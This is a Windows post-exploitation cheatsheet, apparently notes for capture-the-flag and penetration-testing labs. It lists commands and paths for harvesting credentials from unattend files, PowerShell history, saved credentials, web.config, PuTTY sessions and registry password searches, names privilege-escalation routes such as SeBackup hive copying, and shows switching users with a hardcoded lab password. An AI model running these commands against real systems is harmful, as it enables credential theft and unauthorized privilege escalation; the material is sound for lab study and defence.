## Windows Post-Exploitation Cheatsheet

### Unattended Windows Installations (Location of creds sometimes)

```
C:\Unattend.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\system32\sysprep.inf
C:\Windows\system32\sysprep\sysprep.xml
```

### PowerShell History

```cmd
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

### Saved Windows Credentials

```cmd
cmdkey /list
runas /savecred /user:admin cmd.exe
```

### IIS Configuration (Inside web.config, creds may be found)

```
C:\inetpub\wwwroot\web.config
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
```

```cmd
type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
```

### Retrieve Credentials from Software: PuTTY

```cmd
reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
```

### Scheduled Tasks

Some scheduled tasks' binaries can be modified after finding out the user privilege.

### AlwaysInstallElevated

Some installer files can run with admin privileges.

### Insecure Permissions on Service Executable

(Can be only found in CTF)

### Current User with SeBackup / SeRestore Access

This access can be abused and SAM content and SYSTEM registry hive can be copied to extract the admin credentials.

🔗 [https://0xdf.gitlab.io/2025/02/15/htb-cicada.html#exploit-sebackupprivilege](https://0xdf.gitlab.io/2025/02/15/htb-cicada.html#exploit-sebackupprivilege)

### Unpatched Software

### Registry - Password

The registry can be searched for keys and values that contain the word "password":

```cmd
reg query HKLM /f password /t REG_SZ /s
```

To find admin AutoLogon credentials:

```cmd
reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"
```

---

🔗 Reference: [https://sec-fortress.github.io/posts/thm/posts/Retro.html](https://sec-fortress.github.io/posts/thm/posts/Retro.html)
It has webshell and how to get reverse shell

---

### Windows Equivalent of Switch Users Using PowerShell

```powershell
PS C:\> hostname
Sniper
PS C:\> $user = "Sniper\Chris"
PS C:\> $pass = "36mEAhz/B8xQ~2VM"
PS C:\> $secstr = New-Object -TypeName System.Security.SecureString
PS C:\> $pass.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)}
PS C:\> $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $user, $secstr
PS C:\> Invoke-Command -ScriptBlock { whoami } -Credential $cred -Computer localhost
sniper\chris
```

---
